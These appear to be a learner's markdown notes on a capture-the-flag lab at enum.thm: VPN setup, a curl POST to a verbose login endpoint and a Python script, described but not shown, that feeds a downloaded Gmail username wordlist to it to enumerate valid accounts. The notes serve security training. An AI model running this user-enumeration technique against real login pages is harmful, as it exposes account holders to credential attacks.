## to add the vpn:
- sudo openvpn yourfile.ovpn
- ping -c 4 10.48.190.248
- Add 10.48.190.248 to your /etc/hosts file.
- 10.48.190.248 enum.thm
- veriify :
- ping enum.thm
- 
##to find the valid email address.
- write a pyhton script:
- 1. nano scripts.py in the terminal
- 2. paste the scripts
- 3. ctrl + o , enter exit by ctrl + x
- 4. Test it using curl:

- curl -X POST http://enum.thm/labs/verbose_login/functions.php \
-H "X-Requested-With: XMLHttpRequest" \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "username=test@gmail.com&password=password&function=login"

- Response: {"status":"error","message":"Email does not exist"}
- This confirms the endpoint leaks information that can be used for username enumeration.
- wget https://raw.githubusercontent.com/nyxgeek/username-lists/master/usernames-top100/usernames_gmail.com.txt
- 6. then python3 script.py usernames_gmail.com.txt
- 7. to get the username list: 
- 8.  head usernames_gmail.com.txt
- 9. verify:
- head usernames_gmail.com.txt
- it sends a post request to : url = "http://enum.thm/labs/verbose_login/functions.php"
- with the data : data = {
    "username": email,
    "password": "password",
    "function": "login"}

- python3 script.py usernames_gmail.com.txt | grep -v INVALID
<img width="1920" height="1080" alt="Screenshot_2026-07-08_19_49_47" src="https://github.com/user-attachments/assets/8353a794-2123-4eaa-a23a-a439b76038f4" />
